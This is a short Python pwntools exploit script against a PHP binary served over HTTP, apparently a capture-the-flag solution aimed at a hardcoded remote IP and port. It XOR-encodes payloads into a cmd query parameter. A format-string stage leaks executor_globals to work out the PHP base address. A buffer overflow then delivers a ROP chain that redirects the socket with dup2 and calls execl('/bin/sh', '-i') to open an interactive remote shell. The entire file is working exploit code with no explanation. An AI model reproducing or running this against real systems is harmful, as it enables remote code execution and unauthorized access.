from pwn import *
import urllib.parse


def encode_payload(buf):
    buf = list(buf)
    for i in range(63):
        buf[i] ^= 1
    buf = bytes(buf)

    req = "GET /?cmd="
    req += urllib.parse.quote(buf)
    req += " HTTP/1.1\n"
    req += "Cmd-Key: 1\n\n"
    return req.encode()

context.binary = binary = ELF("./php", checksec=False)
log.info("Sending initial payload");

payload = flat({
    0: b'%p-' * 30,
    0x98: p8(0x40)
})
payload = encode_payload(payload)
p = remote("83.136.254.158", 51834)
p.send(payload)
p.recvuntil(b'\r\n\r\n')
resp = p.recvall()
print(resp)
p.close()

leak = resp.split(b'-')[11]
log.success(f"Leaked executor globals: {leak}")
binary.address = int(leak, 16) - binary.sym['executor_globals']
log.success(f"PHP base: {hex(binary.address)}")

rop = ROP(binary)

rop.call('dup2', [4, 0])
rop.call('dup2', [4, 1])
rop.call('dup2', [4, 2])
bin_sh = next(binary.search(b"/bin/sh\x00"))
dash_i = next(binary.search(b"-i\x00"))
rop.call('execl', [bin_sh, bin_sh, dash_i, 0])

#log.info(rop.dump())
payload = encode_payload(b"A" *  0x98 + rop.chain())

log.info("Sending shell payload")
p = remote("83.136.254.158", 51834)
p.send(payload)
p.interactive(prompt = '')
